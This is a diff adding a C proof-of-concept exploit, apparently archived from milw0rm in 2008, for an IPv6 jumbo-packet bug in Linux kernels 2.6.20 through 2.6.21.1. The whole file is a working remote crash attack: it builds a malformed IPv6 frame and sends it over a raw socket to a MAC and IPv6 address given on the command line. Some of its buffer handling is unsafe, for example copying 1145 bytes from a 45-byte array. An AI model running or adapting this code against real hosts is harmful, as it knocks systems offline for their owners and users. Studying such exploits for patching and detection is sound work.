@@ -1,0 +1,134 @@
+/*
+ * Clemens Kurtenbach <ckurtenbach at s21sec . com>
+ * PoC code for exploiting the jumbo bug found in 
+ * linux kernels >=2.6.20 and <=2.6.21.1
+ * gcc -O2 ipv6_jumbo_crash.c -o ipv6_jumbo_crash
+ *
+ */
+
+
+/* io */
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+/* network */
+#include <sys/socket.h>
+#include <linux/if_packet.h>
+#include <linux/if_ether.h>
+#include <linux/if_arp.h>
+#include <netdb.h>
+#include <linux/if.h>
+
+#define MY_FRAME_LEN 1145
+
+char *resolve6(unsigned char *target) {
+	char *ret_addr;
+	struct in6_addr my_in6;
+	char *glob_addr = (char *) &my_in6;
+	struct addrinfo addr_hints, *addr_result;
+	unsigned char out[64];
+
+	memset(&addr_hints, 0, sizeof(addr_hints));
+	addr_hints.ai_family = AF_INET6;
+
+	if (getaddrinfo(target, NULL, &addr_hints, &addr_result) != 0) {
+		printf("getaddrinfo() error\n");
+		exit(1); 
+	}
+	if(getnameinfo(addr_result->ai_addr, addr_result->ai_addrlen, out, sizeof(out), NULL, 0, NI_NUMERICHOST) != 0){
+		printf("getnameinfo() error\n");
+		exit(1);
+	}
+	if(inet_pton(AF_INET6, out, glob_addr) < 0) {
+		printf("inet_pton() error\n");
+		exit(1);
+	}
+	if((ret_addr = malloc(16)) == NULL) {
+		printf("malloc() error\n");
+		exit(1);
+	}
+	memcpy(ret_addr, my_in6.s6_addr, 16);
+	return ret_addr;
+}
+
+int main(int argc, char *argv[]) {
+
+	if (argc < 4) {
+		printf("usage: ./ipv6_jumbo_crash <fe80::1:2:3> <00:11:22:33:44:55> <eth0>\n");
+		exit(1);
+	}
+
+	/* handle IPv6 destination */
+	unsigned char *dest_ip = resolve6(argv[1]);
+
+	/* handle MAC */
+	unsigned char dest_mac[7];
+	sscanf(argv[2], "%x:%x:%x:%x:%x:%x", 
+			(unsigned int*)&dest_mac[0], (unsigned int*)&dest_mac[1], 
+			(unsigned int*)&dest_mac[2], (unsigned int*)&dest_mac[3], 
+			(unsigned int*)&dest_mac[4], (unsigned int*)&dest_mac[5]);
+
+	/* handle interface */
+	unsigned char *iface;
+	iface = argv[3];
+
+	/* buffer for ethernet frame */
+	void *buffer = (void*)malloc(MY_FRAME_LEN);
+
+	/* pointer to ethenet header */
+	unsigned char *etherhead = buffer;
+	struct ethhdr *eh = (struct ethhdr *)etherhead;
+
+	/* our MAC address */
+	unsigned char src_mac[6] = { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55 };
+	unsigned char src_ip[16] = { 0xfe, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02};
+
+	/* prepare socket */
+	int s;
+	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+	if (s < 0) {
+		printf("cannot create socket: [%d]\n",s);
+		exit(1);
+	}
+
+	/* RAW communication */
+	struct sockaddr_ll socket_address;
+	socket_address.sll_family   = PF_PACKET;	
+	socket_address.sll_protocol = htons(ETH_P_IP);	
+	socket_address.sll_ifindex  = if_nametoindex(iface);
+	socket_address.sll_hatype   = ARPHRD_ETHER;
+	socket_address.sll_pkttype  = PACKET_OTHERHOST;
+	socket_address.sll_halen    = ETH_ALEN;		
+
+	/* set the frame header */
+	memcpy((void*)buffer, (void*)dest_mac, ETH_ALEN);
+	memcpy((void*)(buffer+ETH_ALEN), (void*)src_mac, ETH_ALEN);
+	eh->h_proto = 0xdd86; // IPv6
+
+	/* the buffer we want to send */
+	unsigned char bad_buffer[] = { 
+		0x60, 0x3b, 0x50, 0x15, 0x04, 0x08, 0x00, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x43, 0x6e, 0xc2, 0x05, 0x23 };
+
+	memcpy((void*)(buffer+14), (void*)bad_buffer, MY_FRAME_LEN);
+
+	/* overwrite our src and dst ip */
+	memcpy((void*)(buffer+22), (void*)src_ip, 16);
+	memcpy((void*)(buffer+38), dest_ip, 16);
+
+	/* send the buffer */
+	int send_result = 0;
+	send_result = sendto(s, buffer, MY_FRAME_LEN, 0, (struct sockaddr*)&socket_address, sizeof(socket_address));
+	if (send_result == -1) { 
+		printf("could not send frame: [%d]\n", send_result); 
+		exit(1);
+	}
+	else printf("frame send to ip [%s] with mac [%s] on iface [%s]\n",argv[1],argv[2],argv[3]);
+
+	return 0;
+}
+
+// milw0rm.com [2008-01-11]
